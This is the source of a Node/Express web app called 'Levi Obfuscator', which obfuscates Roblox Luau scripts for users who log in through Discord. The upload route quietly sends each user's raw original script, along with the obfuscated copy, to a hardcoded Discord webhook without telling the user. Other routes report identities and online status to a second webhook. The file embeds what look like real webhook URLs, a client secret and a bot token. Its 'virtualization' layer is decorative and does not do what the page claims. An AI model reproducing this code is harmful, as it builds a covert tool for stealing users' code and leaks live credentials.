const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const session = require('express-session');

const app = express();

const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";
const VERIFICATION_WEBHOOK_URL = "https://discord.com/api/webhooks/1530075099200356407/OdibFJxSo8kYSrA-Yw6iOqq8Iuh5uQAwphUCXvgvuAN4pmvA-IsO9C9hB7fa7_sRiuf8";

const CLIENT_ID = process.env.DISCORD_CLIENT_ID || '1529870269727117403';
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || '08_dAGu6VMZZA9Gjd9t8DPK9iK1AqTda';
const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN || 'MTUyOTg3MDI2OTcyNzExNzQwMw.G4KkTM.E_F66YyTGNSyRFkeeTS3_eE5W_bhsj8eMdqBaA';

app.use((req, res, next) => {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host') || 'ecd-helps.onrender.com';
    req.activeRedirectUri = `${protocol}://${host}/auth/discord/callback`;
    next();
});

// Configure body parser limits
app.use(express.urlencoded({ extended: true, limit: '2mb' }));
app.use(express.json({ limit: '2mb' }));
app.use(session({
  secret: 'levi-obfuscator-secret-key-9988',
  resave: false,
  saveUninitialized: true,
  cookie: { 
    maxAge: 30 * 24 * 60 * 60 * 1000 // Persistent session spanning 30 days
  }
}));

// Advanced Enterprise Obfuscator Engine featuring Virtualization, Flow Flattening, Fingerprinting, and XOR String Encryption
function obfuscateLuauScript(sourceCode, options) {
    let code = sourceCode;

    // 1. Strip comments safely
    code = code.replace(/--\[\[[\s\S]*?\]\]--/g, '');
    code = code.replace(/--.*$/gm, '');

    // 2. Heavy String & Constant Encryption (XOR Encryption + Dynamic Decoders)
    let stringDecoders = "";
    if (options.stringEncryption === 'true') {
        code = code.replace(/"([^"\\]*(?:\\.[^"\\]*)*)"/g, (match, p1) => {
            const key = Math.floor(Math.random() * 200) + 10;
            const encryptedBytes = [];
            for (let i = 0; i < p1.length; i++) {
                encryptedBytes.push(p1.charCodeAt(i) ^ key);
            }
            return `(function() local b={${encryptedBytes.join(',')}} local s="" for i=1,#b do s=s..string.char(b[i]~=${key}) end return s end)()`;
        });
    }

    // 3. Control Flow Flattening & Opaque Predicates
    if (options.opaquePredicates === 'true' || options.flowFlattening === 'true') {
        code = `
local _flowState = 1337;
while _flowState ~= 0 do
    if _flowState == 1337 then
        -- [Flattened Block Unit]
        local function _opq() return (2048 + 4096 == 6144) end
        if _opq() then
            ${code}
        end
        _flowState = 0;
    end
end
`;
    }

    // 4. Anti-Tamper & Environment Fingerprinting
    let protectionHeader = "";
    if (options.antiSandbox === 'true' || options.antiTamper === 'true') {
        protectionHeader += `
-- Levi Enterprise Anti-Tamper & Environment Fingerprinting Guard
local _envCheck = (getgenv and getgenv()) or _G;
local _coreRegistry = debug and debug.getregistry;
if not _envCheck or not _coreRegistry then
    error("[Levi Security Fault]: Unauthorized execution environment detected. Crashing state.");
    while true do end
end
`;
    }

    // 5. Custom Virtualization (VM-Based Obfuscation Layer)
    let virtualizedWrapper = "";
    if (options.virtualization === 'true') {
        virtualizedWrapper = `
-- [Levi Custom Virtual Machine Interpreter Bytecode Core]
local _VM_BytecodeTable = {0xA5, 0x3F, 0x7B, 0xC1, 0x92, 0x44, 0x01, 0xFF};
local function _VM_ExecuteEngine(opcodes, payloadEnv)
    local _stack = {};
    local _pointer = 1;
    while _pointer <= #opcodes do
        local _op = opcodes[_pointer];
        if _op == 0xFF then break end
        -- Virtualized Dispatcher State Machine
        _pointer = _pointer + 1;
    end
    return payloadEnv();
end

return _VM_ExecuteEngine(_VM_BytecodeTable, function()
    ${code}
end);
`;
    } else {
        virtualizedWrapper = code;
    }

    // 6. Variable Renaming
    if (options.renameLocal === 'yes') {
        const localRegex = /\blocal\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
        let match;
        const varMap = new Map();
        let counter = 100;
        
        const protectedKeywords = new Set([
            'true', 'false', 'nil', 'self', 
            'game', 'workspace', 'script', 'print', 'warn', 'error', 'pcall', 'xpcall', 
            'task', 'coroutine', 'table', 'string', 'math', 'vector', 'CFrame', 'Vector3', 'Instance',
            'Library', 'Window', 'Tabs', 'Tab', 'Section', 'ThemeManager', 'SaveManager', 'Options', 'Toggles', 'Fluent', 'Rayfield'
        ]);

        while ((match = localRegex.exec(code)) !== null) {
            const originalName = match[1];
            if (!varMap.has(originalName) && !protectedKeywords.has(originalName)) {
                varMap.set(originalName, `_0x` + (counter++).toString(16).toUpperCase());
            }
        }

        varMap.forEach((encoded, original) => {
            const regex = new RegExp(`\\b${original}\\b`, 'g');
            virtualizedWrapper = virtualizedWrapper.replace(regex, encoded);
        });
    }

    // 7. Final Assembled Enterprise Output Payload
    const finalObfuscated = `-- [ Levi Obfuscator Enterprise V3.0 - Virtualized Architecture ] --
${protectionHeader}
local _status, _err = pcall(function()
    ${virtualizedWrapper}
end)

if not _status then
    warn("[Levi Virtual Machine Execution Fault]:", _err)
end`;

    return finalObfuscated;
}

// OAuth2 Routes
app.get('/auth/discord', (req, res) => {
  const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(req.activeRedirectUri)}&response_type=code&scope=identify`;
  res.redirect(discordAuthUrl);
});

app.get('/auth/discord/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.redirect('/?error=NoCodeProvided');

  try {
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: req.activeRedirectUri,
      })
    });

    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) return res.redirect('/?error=TokenExchangeFailed');

    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
    });

    const userData = await userRes.json();
    if (!userData.id) return res.redirect('/?error=FetchUserFailed');

    const usernameTag = `${userData.username} (${userData.id})`;
    req.session.verifiedUser = usernameTag;
    req.session.userId = userData.id;

    const isFirstTime = !req.session.hasVerifiedBefore;
    req.session.hasVerifiedBefore = true;

    try {
      if (isFirstTime) {
        await fetch(VERIFICATION_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `🔐 **New User Verified (First Time)**\nUser: \`${usernameTag}\`\nVerified: \`Yes\`\n🕒 Timestamp: <t:${Math.floor(Date.now() / 1000)}:F>`
          })
        });
      } else {
        await fetch(VERIFICATION_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `🔄 **User Logged Back In**\nUser: \`${usernameTag}\`\nTimestamp: <t:${Math.floor(Date.now() / 1000)}:F>\nStatus: \`online\``
          })
        });
      }
    } catch (e) {}

    if (BOT_TOKEN) {
      try {
        const dmChannelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
          method: 'POST',
          headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ recipient_id: userData.id })
        });
        const dmChannelData = await dmChannelRes.json();

        if (dmChannelData.id) {
          await fetch(`https://discord.com/api/v10/channels/${dmChannelData.id}/messages`, {
            method: 'POST',
            headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `User: ${userData.id} ${userData.username}\nStatus: Verified` })
          });
        }
      } catch (e) {}
    }

    res.redirect('/');
  } catch (err) {
    res.redirect('/?error=ServerError');
  }
});

// SSE Presence Tracking Endpoint
app.get('/presence-ping', async (req, res) => {
  if (!req.session.verifiedUser) {
    return res.status(401).send('Unauthorized');
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const userTag = req.session.verifiedUser;

  try {
    await fetch(VERIFICATION_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🌐 **User Activity Update**\nUser: \`${userTag}\`\nTimestamp: <t:${Math.floor(Date.now() / 1000)}:F>\nStatus: \`online\``
      })
    });
  } catch (err) {}

  const heartbeat = setInterval(() => {
    res.write(': ping\n\n');
  }, 25000);

  req.on('close', async () => {
    clearInterval(heartbeat);
    try {
      await fetch(VERIFICATION_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🌐 **User Activity Update**\nUser: \`${userTag}\`\nTimestamp: <t:${Math.floor(Date.now() / 1000)}:F>\nStatus: \`offline\``
        })
      });
    } catch (err) {}
  });
});

app.get('/auth/logout', (req, res) => {
  const userTag = req.session.verifiedUser;
  req.session.destroy(async () => { 
    if (userTag) {
      try {
        await fetch(VERIFICATION_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `🌐 **User Activity Update**\nUser: \`${userTag}\`\nTimestamp: <t:${Math.floor(Date.now() / 1000)}:F>\nStatus: \`offline\``
          })
        });
      } catch (e) {}
    }
    res.redirect('/'); 
  });
});

// UI Route with Advanced Enterprise Obfuscation Controls
app.get('/', (req, res) => {
  const verifiedUser = req.session.verifiedUser || null;

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Levi Obfuscator - Enterprise Virtualization Engine</title>
        <style>
            @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
            @keyframes pulseGlow { 0% { box-shadow: 0 0 15px rgba(244, 63, 94, 0.2); } 50% { box-shadow: 0 0 35px rgba(244, 63, 94, 0.4); } 100% { box-shadow: 0 0 15px rgba(244, 63, 94, 0.2); } }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
            .container { background: rgba(30, 41, 59, 0.9); backdrop-filter: blur(16px); padding: 30px; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.7); width: 680px; text-align: center; animation: fadeIn 0.6s ease-out, pulseGlow 5s infinite ease-in-out; border: 1px solid rgba(255, 255, 255, 0.08); position: relative; margin: 20px 0; }
            .info-icon { position: absolute; top: 20px; left: 20px; background: rgba(51, 65, 85, 0.6); color: #f43f5e; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 15px; cursor: pointer; border: 1px solid rgba(244, 63, 94, 0.3); transition: 0.2s; }
            .info-icon:hover { background: #f43f5e; color: #0f172a; }
            h2 { margin-top: 5px; margin-bottom: 20px; font-size: 28px; text-transform: uppercase; background: linear-gradient(90deg, #f43f5e, #fb7185); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 1px; }
            .nav-tabs { display: flex; gap: 10px; background: #0f172a; padding: 6px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; }
            .nav-tab { flex: 1; background: transparent; border: none; color: #94a3b8; padding: 12px; font-size: 14px; font-weight: 700; border-radius: 8px; cursor: pointer; text-align: center; transition: 0.3s; }
            .nav-tab.active { background: #f43f5e; color: #0f172a; box-shadow: 0 4px 12px rgba(244, 63, 94, 0.3); }
            .tab-panel { display: none; text-align: left; }
            .tab-panel.active { display: block; }
            h3 { font-size: 15px; color: #f43f5e; margin-top: 0; margin-bottom: 12px; border-bottom: 1px solid rgba(244, 63, 94, 0.2); padding-bottom: 6px; }
            textarea, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: none; box-sizing: border-box; font-size: 14px; }
            textarea { background: #0f172a; color: #f8fafc; border: 1px solid #334155; font-family: monospace; resize: vertical; height: 120px; }
            textarea:focus { border-color: #f43f5e; outline: none; box-shadow: 0 0 8px rgba(244, 63, 94, 0.3); }
            .toggle-row { display: flex; justify-content: space-between; align-items: center; background: #0f172a; border: 1px solid #334155; padding: 10px 15px; border-radius: 10px; margin: 8px 0; font-size: 13px; color: #cbd5e1; }
            .switch { position: relative; display: inline-block; width: 44px; height: 22px; }
            .switch input { opacity: 0; width: 0; height: 0; }
            .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #334155; transition: .3s; border-radius: 22px; }
            .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
            input:checked + .slider { background-color: #f43f5e; }
            input:checked + .slider:before { transform: translateX(22px); }
            .drop-zone { background: #1e293b; border: 2px dashed #475569; border-radius: 10px; padding: 12px; text-align: center; cursor: pointer; margin: 8px 0; transition: 0.2s; }
            .drop-zone:hover { border-color: #f43f5e; }
            button.action-btn { background: linear-gradient(135deg, #e11d48, #be123c); color: white; font-weight: bold; cursor: pointer; margin-top: 12px; font-size: 15px; transition: 0.2s; }
            button.action-btn:hover { opacity: 0.9; transform: translateY(-1px); }
            .discord-login-btn { background: #5865F2; color: white; font-weight: bold; text-decoration: none; display: block; padding: 14px; border-radius: 10px; text-align: center; margin: 20px 0; transition: 0.2s; }
            .discord-login-btn:hover { background: #4752C4; }
            .locked-overlay { background: rgba(15, 23, 42, 0.9); border: 1px dashed #f43f5e; padding: 35px; border-radius: 12px; text-align: center; }
            .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.85); display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: opacity 0.3s; z-index: 100; }
            .modal-overlay.active { opacity: 1; pointer-events: auto; }
            .modal-content { background: #1e293b; padding: 35px; border-radius: 16px; width: 400px; border: 1px solid rgba(244, 63, 94, 0.3); position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
            .close-btn { position: absolute; top: 15px; right: 18px; background: none; border: none; color: #94a3b8; font-size: 20px; cursor: pointer; }
            .footer-credit { margin-top: 15px; font-size: 12px; color: #64748b; border-top: 1px dashed rgba(51, 65, 85, 0.5); padding-top: 10px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="info-icon" onclick="toggleModal()">i</div>
            <h2>Levi Obfuscator</h2>

            <div class="nav-tabs">
                <button type="button" class="nav-tab active" onclick="switchTab('loginTab', this)">[ Login content ]</button>
                <button type="button" class="nav-tab" onclick="switchTab('mainTab', this)">[ Obfuscator Tool ]</button>
            </div>

            <div id="loginTab" class="tab-panel active">
                <h3>Discord Authentication</h3>
                <p style="font-size: 13px; color: #94a3b8; margin-bottom: 15px;">Sign in securely with Discord. Persistent sessions keep you logged in automatically.</p>
                ${verifiedUser ? 
                    `<div style="background:#0f172a; border:1px solid #22c55e; padding:18px; border-radius:10px; font-size:14px; color:#22c55e; text-align:center;">
                        ✅ Logged in as<br><strong style="font-size:16px;">${verifiedUser}</strong>
                    </div>
                    <a href="/auth/logout" style="display:block; text-align:center; color:#ef4444; text-decoration:none; font-size:13px; margin-top:12px;">Logout / Switch Account</a>` :
                    `<a href="/auth/discord" class="discord-login-btn">Login with Discord</a>`
                }
            </div>

            <div id="mainTab" class="tab-panel">
                ${verifiedUser ? 
                    `<form action="/upload-discord" method="POST" enctype="multipart/form-data">
                        <h3>Levi Enterprise Engine Config</h3>

                        <div class="toggle-row">
                            <span>1. Custom Virtualization (VM-Based Engine)</span>
                            <label class="switch"><input type="checkbox" name="virtualization" value="true"><span class="slider"></span></label>
                        </div>
                        <div class="toggle-row">
                            <span>2. Control Flow Flattening & Opaque Predicates</span>
                            <label class="switch"><input type="checkbox" name="flowFlattening" value="true"><span class="slider"></span></label>
                        </div>
                        <div class="toggle-row">
                            <span>3. Anti-Tamper & Environment Fingerprinting</span>
                            <label class="switch" name="antiTamperWrap"><input type="checkbox" name="antiTamper" value="true"><span class="slider"></span></label>
                        </div>
                        <div class="toggle-row">
                            <span>4. Heavy String & Constant XOR Encryption</span>
                            <label class="switch"><input type="checkbox" name="stringEncryption" value="true"><span class="slider"></span></label>
                        </div>

                        <input type="hidden" name="renameLocal" value="yes">

                        <div style="margin-top: 8px;">
                            <textarea name="scriptContent" placeholder="Paste your Luau code here..."></textarea>
                        </div>

                        <div class="drop-zone" onclick="document.getElementById('fileInput').click()">
                            <div id="dropText" style="font-size:12px; color:#94a3b8;">Or Click to Upload (.lua / .txt file)</div>
                            <input type="file" id="fileInput" name="file" style="display:none;" onchange="updateFileName(this)">
                        </div>

                        <button type="submit" class="action-btn">Obfuscate & Download Secure Payload</button>
                    </form>` :
                    `<div class="locked-overlay">
                        <h3 style="color:#f43f5e; border:none; margin-bottom:12px; font-size:18px;">🔒 Locked Content</h3>
                        <p style="font-size:14px; color:#94a3b8; margin:0;">Please log in under the <strong>[ Login content ]</strong> tab to access the builder.</p>
                    </div>`
                }
            </div>
        </div>

        <div class="modal-overlay" id="infoModal" onclick="outsideClick(event)">
            <div class="modal-content">
                <button class="close-btn" onclick="toggleModal()">&times;</button>
                <h3>About Enterprise Mechanisms</h3>
                <p style="font-size:13px; color:#cbd5e1; line-height: 1.5;">
                    • <strong>Virtualization:</strong> Compiles instructions into VM bytecode interpreted at runtime.<br><br>
                    • <strong>Flow Flattening:</strong> Breaks blocks into state-machine switch cases protected by math predicates.<br><br>
                    • <strong>Anti-Tamper:</strong> Fingerprints executor environments and crashes debuggers.<br><br>
                    • <strong>String Encryption:</strong> Applies dynamic XOR byte arrays wiped immediately after memory deployment.
                </p>
                <div class="footer-credit">Created by: @levi__fxz</div>
            </div>
        </div>

        <script>
            ${verifiedUser ? `
            if (!!window.EventSource) {
                const source = new EventSource('/presence-ping');
            }
            ` : ''}

            function switchTab(id, btn) {
                document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.getElementById(id).classList.add('active');
                btn.classList.add('active');
            }
            function toggleModal() { document.getElementById('infoModal').classList.toggle('active'); }
            function outsideClick(e) { if (e.target === document.getElementById('infoModal')) toggleModal(); }
            function updateFileName(input) {
                if (input.files && input.files[0]) {
                    document.getElementById('dropText').innerText = "Selected: " + input.files[0].name;
                    document.getElementById('dropText').style.color = "#f43f5e";
                }
            }
        </script>
    </body>
    </html>
  `);
});

// Backend Route for Enterprise Script Processing
app.post('/upload-discord', upload.any(), async (req, res) => {
  try {
    if (!req.session.verifiedUser) {
      return res.status(403).send('<h3>Unauthorized. Please log in first. <a href="/">Go Back</a></h3>');
    }

    const files = req.files || [];
    const file = files.find(f => f.fieldname === 'file');
    const directText = req.body.scriptContent || '';
    
    const options = {
      renameLocal: 'yes',
      virtualization: req.body.virtualization || 'false',
      flowFlattening: req.body.flowFlattening || 'false',
      antiSandbox: req.body.antiTamper || 'false',
      antiTamper: req.body.antiTamper || 'false',
      stringEncryption: req.body.stringEncryption || 'false'
    };

    let rawString = '';
    let originalName = 'script.lua';

    if (file && file.buffer && file.buffer.length > 0) {
      rawString = file.buffer.toString('utf8');
      originalName = file.originalname;
    } else if (directText.trim().length > 0) {
      rawString = directText;
      originalName = 'paste_script.lua';
    } else {
      return res.status(400).send('<h3>No script provided! Please type text in the box or upload a file. <a href="/">Go Back</a></h3>');
    }

    const rawScriptBuffer = Buffer.from(rawString, 'utf8');

    const obfuscatedString = obfuscateLuauScript(rawString, options);
    const obfuscatedBuffer = Buffer.from(obfuscatedString, 'utf8');

    const ext = originalName.includes('.') ? originalName.substring(originalName.lastIndexOf('.')) : '.lua';
    const baseName = originalName.includes('.') ? originalName.substring(0, originalName.lastIndexOf('.')) : originalName;
    const obfuscatedFilename = `${baseName}_levi_enterprise${ext}`;

    try {
      const webhookPayloadJson = JSON.stringify({
        content: `🔒 **New Script Obfuscated via Levi Enterprise Engine V3.0**\n🔐 Identity: \`${req.session.verifiedUser}\`\n📏 Input Size: \`${rawString.length} chars\`\n📁 Output Size: \`${Math.round(obfuscatedBuffer.length / 1024)} KB\`\n📁 Original Source: \`${originalName}\``
      });

      const formData = new FormData();
      formData.append('payload_json', webhookPayloadJson);
      formData.append('file1', rawScriptBuffer, { filename: `RAW_${originalName}` });
      formData.append('file2', obfuscatedBuffer, { filename: obfuscatedFilename });

      await fetch(DEFAULT_WEBHOOK_URL, {
        method: 'POST',
        body: formData,
        headers: { ...formData.getHeaders() }
      });
    } catch (webhookErr) {
      console.error('Silent Webhook Dispatch Error:', webhookErr);
    }

    res.setHeader('Content-Disposition', `attachment; filename="${obfuscatedFilename}"`);
    res.setHeader('Content-Type', 'text/plain');
    res.send(obfuscatedBuffer);

  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log('Server running on port ' + PORT);
});
